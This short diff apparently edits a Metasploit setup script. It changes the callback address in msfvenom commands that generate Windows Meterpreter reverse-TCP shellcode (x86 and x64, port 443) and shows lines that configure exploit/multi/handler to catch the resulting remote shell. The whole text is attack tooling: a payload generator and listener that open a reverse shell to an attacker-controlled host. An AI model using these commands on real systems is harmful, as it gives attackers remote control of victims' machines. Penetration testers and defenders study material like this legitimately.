@@ -1,5 +1,5 @@
-##msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.23.28.22 LPORT=443 -a x86 -f c 2>/dev/null | egrep "^\"" | tr -d "\"\n;" >met.mf
-#msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.23.28.22 LPORT=443 -a x64 -f c 2>/dev/null | egrep "^\"" | tr -d "\"\n;" >met.mf
+##msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.1.1.2 LPORT=443 -a x86 -f c 2>/dev/null | egrep "^\"" | tr -d "\"\n;" >met.mf
+#msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.1.1.2 LPORT=443 -a x64 -f c 2>/dev/null | egrep "^\"" | tr -d "\"\n;" >met.mf
 use exploit/multi/handler
 #set payload windows/meterpreter_reverse_tcp
 set payload windows/x64/meterpreter_reverse_tcp
